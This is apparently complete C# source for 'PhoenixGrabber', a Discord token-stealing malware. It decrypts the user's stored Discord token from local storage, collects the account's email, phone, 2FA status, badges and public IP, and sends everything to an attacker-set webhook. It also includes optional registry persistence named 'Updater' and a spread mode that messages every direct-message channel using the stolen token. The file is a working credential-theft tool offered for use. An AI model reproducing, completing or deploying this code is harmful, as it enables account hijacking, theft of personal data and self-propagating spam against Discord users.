using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Program
{
    static class Program
    {
        #region Main
        static void Main()
        {
            Start();
            //SpreadMode
            //RunOnStartup
            //FakeError
        }
        #endregion

        #region Spread Mode
        static void SpreadMode(string message)
        {
            var request = SendGet("/users/@me/channels", secret());
            var array = JArray.Parse(request);
            foreach (dynamic entry in array)
            {
                Send("/channels/" + entry.id + "/messages", "POST", secret(), "{\"content\":\"" + message + "\"}");
                Thread.Sleep(200);
            }
        }
        #endregion

        #region Request
        static void Send(string endpoint, string method, string auth, string json = null)
        {
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.DefaultConnectionLimit = 5000;
                var request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10" + endpoint);
                request.Headers.Add("Authorization", auth);
                request.Method = method;
                if (!string.IsNullOrEmpty(json))
                {
                    request.ContentType = "application/json";
                    using (var stream = new StreamWriter(request.GetRequestStream()))
                    {
                        stream.Write(json);
                    }
                }
                else
                {
                    request.ContentLength = 0;
                }
                request.GetResponse();
                request.Abort();
            }
            catch { }
        }

        static string SendGet(string endpoint, string auth, string method = null, string json = null)
        {
            string text;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10" + endpoint);
            request.Headers.Add("Authorization", auth);
            if (string.IsNullOrEmpty(method))
            {
                request.Method = "GET";
            }
            else
            {
                request.Method = method;
            }
            if (!string.IsNullOrEmpty(json))
            {
                request.ContentType = "application/json";
                using (var stream = new StreamWriter(request.GetRequestStream()))
                {
                    stream.Write(json);
                }
            }
            else
            {
                request.ContentLength = 0;
            }
            var response = (HttpWebResponse)request.GetResponse();
            using (var stream = new StreamReader(response.GetResponseStream()))
            {
                text = stream.ReadToEnd();
                stream.Dispose();
            }
            request.Abort();
            response.Close();
            return text;
        }
        #endregion

        #region Run On Startup
        static void RunOnStartup()
        {
            try { RegistryKey startup = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); startup.SetValue("Updater", Assembly.GetExecutingAssembly().Location); } catch { }
        }
        #endregion

        #region Start
        static void Start()
        {
            try
            {
                var request = SendGet("/users/@me", secret());
                var id = JObject.Parse(request)["id"].ToString();
                if (string.IsNullOrEmpty(id))
                {
                    id = "N/A";
                }
                var username = JObject.Parse(request)["username"].ToString();
                if (string.IsNullOrEmpty(username))
                {
                    username = "N/A";
                }
                var discriminator = JObject.Parse(request)["discriminator"].ToString();
                if (string.IsNullOrEmpty(discriminator))
                {
                    discriminator = "N/A";
                }
                var getbadges = JObject.Parse(request)["flags"].ToString();
                string badges = "";
                if (getbadges == "1")
                {
                    badges += "Discord Employee, ";
                }
                if (getbadges == "2")
                {
                    badges += "Partnered Server Owner, ";
                }
                if (getbadges == "4")
                {
                    badges += "HypeSquad Events Member, ";
                }
                if (getbadges == "8")
                {
                    badges += "Bug Hunter Level 1, ";
                }
                if (getbadges == "64")
                {
                    badges += "House Bravery Member, ";
                }
                if (getbadges == "128")
                {
                    badges += "House Brilliance Member, ";
                }
                if (getbadges == "256")
                {
                    badges += "House Balance Member, ";
                }
                if (getbadges == "512")
                {
                    badges += "Early Nitro Supporter, ";
                }
                if (getbadges == "16384")
                {
                    badges += "Bug Hunter Level 2, ";
                }
                if (getbadges == "131072")
                {
                    badges += "Early Verified Bot Developer, ";
                }
                if (string.IsNullOrEmpty(badges))
                {
                    badges = "N/A";
                }
                var email = JObject.Parse(request)["email"].ToString();
                if (string.IsNullOrEmpty(email))
                {
                    email = "N/A";
                }
                var phone = JObject.Parse(request)["phone"].ToString();
                if (string.IsNullOrEmpty(phone))
                {
                    phone = "N/A";
                }
                var bio = JObject.Parse(request)["bio"].ToString();
                if (string.IsNullOrEmpty(bio))
                {
                    bio = "N/A";
                }
                var locale = JObject.Parse(request)["locale"].ToString();
                if (string.IsNullOrEmpty(locale))
                {
                    locale = "N/A";
                }
                var mfa = JObject.Parse(request)["mfa_enabled"].ToString();
                if (string.IsNullOrEmpty(mfa))
                {
                    mfa = "N/A";
                }
                var avatarid = JObject.Parse(request)["avatar"].ToString();
                string avatar;
                if (string.IsNullOrEmpty(avatarid))
                {
                    avatar = "N/A";
                }
                else
                {
                    avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatarid + ".webp";
                }
                var request2 = SendGet("/users/@me/settings", secret());
                var status = JObject.Parse(request2)["status"].ToString();
                if (string.IsNullOrEmpty(status))
                {
                    status = "N/A";
                }
                DiscordEmbed("New account from " + username + "#" + discriminator, "1018364", id, email, phone, bio, locale, badges, mfa, status, avatar, I(), secret());
            } catch { }
        }
        #endregion

        #region IP Address
        static string I()
        {
            string ii = "";
            try { ii = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/").Trim(); } catch { ii = "N/A"; }
            return ii;
        }
        #endregion

        #region Get Token
        static string secret()
        {
            string secret2 = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    secret2 = secret3(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return secret2;
        }

        static byte[] secret4(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string secret3(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(secret4(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion

        #region Discord embed
        static void DiscordEmbed(string title, string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8, string field9, string field10, string field11)
        {
            try
            {
                var wr = WebRequest.Create("Webhook");
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                {
                    sw.Write("{\"username\":\"PhoenixGrabber\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent | PhoenixGrabber\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field7 + "\"},{\"name\":\"Status\",\"value\":\"" + field8 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field9 + "\"},{\"name\":\"IP Address\",\"value\":\"" + field10 + "\"},{\"name\":\"Discord Token\",\"value\":\"" + field11 + "\"}]}]}");
                }
                wr.GetResponse();
            } catch { }
        }
        #endregion
    }
}